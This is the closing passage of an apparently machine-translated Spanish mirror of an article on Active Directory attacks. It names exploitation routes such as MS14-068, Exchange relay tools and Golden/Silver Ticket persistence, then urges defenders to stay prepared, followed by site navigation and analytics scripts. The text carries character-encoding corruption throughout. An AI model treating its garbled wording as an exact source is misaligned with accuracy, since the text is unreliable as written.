href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MS14-068</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , un mont√≥n de </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;">errores</font></a><font style="vertical-align: inherit;"> de </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">impresora</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> y delegaci√≥n sin restricciones, ataques a Exchange ( </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ruler</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PrivExchange</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=nl&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ExchangeRelayX</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) pueden ampliar significativamente el alcance del ataque. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Las t√©cnicas de ataque y los m√©todos de fijaci√≥n (Boleto de oro, Boleto de plata, Pase-El-Hash, Over pass the hash, SID History, DC Shadow, etc.) cambian constantemente, y el equipo de defensa siempre debe estar listo para nuevos tipos de ataques.</font></font></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/449278/">https://habr.com/ru/post/449278/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../449264/index.html">Creaci√≥n de un sistema de informes para 1C: ERP basado en OLAP y Excel</a></li>
<li><a href="../449266/index.html">3 informes con RusCrypto: conferencias con experiencia</a></li>
<li><a href="../449270/index.html">Yandex ha publicado una descripci√≥n general del mercado de vacantes de TI</a></li>
<li><a href="../449274/index.html">Gran pantalla de 7 segmentos con brillo de ne√≥n en el ESP8266</a></li>
<li><a href="../449276/index.html">Cambio de carrera a los 35. Mi experiencia y primeros √©xitos.</a></li>
<li><a href="../449280/index.html">C√≥mo funciona la plataforma de juegos en la nube para clientes b2b y b2c. Soluciones para una excelente imagen y luchar con la √∫ltima milla</a></li>
<li><a href="../449282/index.html">Copia de seguridad, Parte 1: Prop√≥sito, descripci√≥n general de t√©cnicas y tecnolog√≠as</a></li>
<li><a href="../449284/index.html">Vendo cebollas online</a></li>
<li><a href="../449286/index.html">Make on go API GraphQL</a></li>
<li><a href="../449288/index.html">¬øQu√© equipo se necesita para crear una tienda en l√≠nea realmente buena?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>